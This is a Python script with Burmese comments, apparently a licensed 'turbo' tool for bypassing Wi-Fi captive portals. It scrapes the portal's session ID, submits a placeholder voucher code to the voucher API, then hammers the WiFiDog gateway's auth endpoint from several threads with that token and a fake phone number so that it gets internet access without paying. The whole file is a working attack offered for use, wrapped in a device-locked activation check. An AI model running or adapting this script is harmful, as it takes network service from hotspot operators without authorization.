import requests
import re
import urllib3
import time
import threading
from urllib.parse import urlparse, parse_qs, urljoin
import os
import sys
import json
import uuid
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- LICENSE SETTINGS ---
CONFIG_FILE = ".app_license.json"
DEVICE_ID_FILE = ".device_id"
SECRET_SALT = "Chetstrinne9377"

def get_device_id():
    # ဖုန်းအတွက် Device ID အသစ်ထုတ်ခြင်း (သို့) ရှိပြီးသားကို ပြန်ယူခြင်း
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            return f.read().strip()
    else:
        new_id = str(uuid.uuid4().hex)[:16].upper() # 16-လုံးပါသော ID
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
        return new_id

def verify_license():
    device_id = get_device_id()
    # Device ID နှင့် Secret Password ကိုပေါင်းပြီး Key အဖြစ် ပြောင်းလဲခြင်း
    expected_key = hashlib.sha256((device_id + SECRET_SALT).encode()).hexdigest()[:20].upper()

    # Key ထည့်ပြီးသားဖြစ်မဖြစ် စစ်ဆေးခြင်း
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                if data.get("is_activated") and data.get("license_key") == expected_key:
                    return True
        except:
            pass # Error ရှိပါက ကျော်သွားမည်

    # Key မထည့်ရသေးပါက Device ID ကို ပြပြီး Key တောင်းပါမည်
    print("\n[-] Unauthorized Access! Please activate your script.")
    print(f"[*] Your Device ID: {device_id}")
    print("[*] Please send this Device ID to the Admin to get your License Key.\n")
    
    user_key = input("[?] Enter your License Key: ").strip()

    if user_key == expected_key:
        print("\n[+] Activation Successful! Thank you.\n")
        with open(CONFIG_FILE, "w") as f:
            json.dump({"is_activated": True, "license_key": expected_key}, f)
        return True
    else:
        print("\n[-] Invalid Key. Exiting...")
        sys.exit()


# --- SETTINGS ---
PING_THREADS = 5
PING_INTERVAL = 0.1 

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
    while True:
        try:
            res = session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # ၁။ License အရင်စစ်ပါမည်
    verify_license() 
    
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၂။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၃။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    print(f"[+] Voucher API Response: {v_res.status_code}")
                except:
                    print("[!] Voucher API Failed (Gateway might not require it)")

                # ၄။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
